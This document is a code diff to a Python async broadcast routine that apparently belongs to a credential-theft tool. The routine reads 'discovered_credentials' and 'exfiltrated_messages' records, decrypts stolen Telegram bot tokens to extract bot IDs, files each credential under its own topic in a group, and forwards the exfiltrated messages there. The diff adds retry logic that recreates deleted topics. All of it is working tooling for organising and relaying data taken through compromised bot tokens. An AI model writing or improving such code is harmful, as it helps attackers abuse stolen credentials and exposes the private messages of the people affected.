@@ -252,49 +252,50 @@ async def _broadcast_logic():
             cred_info = msg.get("discovered_credentials", {})
             meta = cred_info.get("meta", {}) if cred_info else {}
             
-            # 1. Check Cache, then Meta, then Create
+            # 1. Resolve Topic Name (Always needed for potential recreation)
+            # Priority: @username / botid -> chat_name -> Cred-ID
+            bot_username = meta.get("bot_username")
+            bot_id = meta.get("bot_id")
+            
+            # If we lack bot info (Legacy data), try to fetch and extract it from token
+            if not bot_id and not meta.get("bot_id"):
+                 # Only fetch if we really need it and haven't tried before (optimization)
+                 # But for safety/simplicity let's just do the fallback logic if basic checks fail
+                 pass 
+
+            if bot_username and bot_id:
+                 topic_name = f"@{bot_username} / {bot_id}"
+            elif bot_id:
+                 topic_name = f"@unknown / {bot_id}"
+            elif meta.get("chat_name"):
+                 topic_name = f"{meta.get('chat_name')} (Legacy)"
+            else:
+                 topic_name = f"Cred-{cred_id[:8]}"
+
+            # 2. Check Cache/DB for ID
             thread_id = cached_topic_ids.get(cred_id) or meta.get("topic_id")
 
             if not thread_id:
-                # Determine Topic Name only if we need to create
-                # Priority: @username / botid
-                bot_username = meta.get("bot_username")
-                bot_id = meta.get("bot_id")
-                
-                # If we lack bot info (Legacy data), try to fetch and extract it from token
-                if not bot_id:
-                    try:
-                        # Fetch token to extract ID
+                # Determines if we need to fetch token for legacy fallback
+                if "unknown" in topic_name and not bot_id:
+                     try:
                         cred_res = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).single().execute()
                         if cred_res.data:
                             decrypted = security.decrypt(cred_res.data["bot_token"])
-                            # Token format: 123456789:ABC...
                             if ":" in decrypted:
                                 bot_id = decrypted.split(":")[0]
-                                # Save for future
                                 meta["bot_id"] = bot_id
-                    except Exception as e:
-                        print(f"    ⚠️ [Broadcast] Failed to extract bot_id for legacy cred: {e}")
+                                topic_name = f"@unknown / {bot_id}"
+                     except: pass
 
-                if bot_username and bot_id:
-                     topic_name = f"@{bot_username} / {bot_id}"
-                elif bot_id:
-                     # We have ID but no username (common for legacy)
-                     topic_name = f"@unknown / {bot_id}"
-                else:
-                     # True fallback if everything fails
-                     topic_name = f"Cred-{cred_id[:8]}"
-                
                 # Ensure Topic
                 thread_id = await broadcaster_service.ensure_topic(group_id, topic_name)
                 
-                # Send Header for new topic created by broadcaster (lazy creation)
+                # Send Header
                 if thread_id:
                      await broadcaster_service.send_topic_header(group_id, thread_id, topic_name)
                 
-                # Update DB (Persistent Cache)
-                # We fetch current meta again to avoid overwriting race (optimistic)
-                # But for simplicity, we merge with what we have.
+                # Update DB
                 meta["topic_id"] = thread_id
                 db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
                 print(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
@@ -302,14 +303,29 @@ async def _broadcast_logic():
             # Update local cache
             cached_topic_ids[cred_id] = thread_id
             
-            # Send Message
-            await broadcaster_service.send_message(group_id, thread_id, msg)
+            # Send Message (with retry for deleted topics)
+            try:
+                await broadcaster_service.send_message(group_id, thread_id, msg)
+            except Exception as e:
+                # Check for topic deletion/not found
+                err_str = str(e)
+                if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
+                    print(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
+                    # Recreate
+                    thread_id = await broadcaster_service.ensure_topic(group_id, topic_name)
+                    # Update DB
+                    meta["topic_id"] = thread_id
+                    db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
+                    # Retry Send
+                    await broadcaster_service.send_message(group_id, thread_id, msg)
+                else:
+                    raise e
             
             # Update status
             db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg["id"]).execute()
             sent_count += 1
             
-            # Rate limit (ASYNC sleep to not block the event loop)
+            # Rate limit
             await asyncio.sleep(2.0) 
 
         except Exception as e:
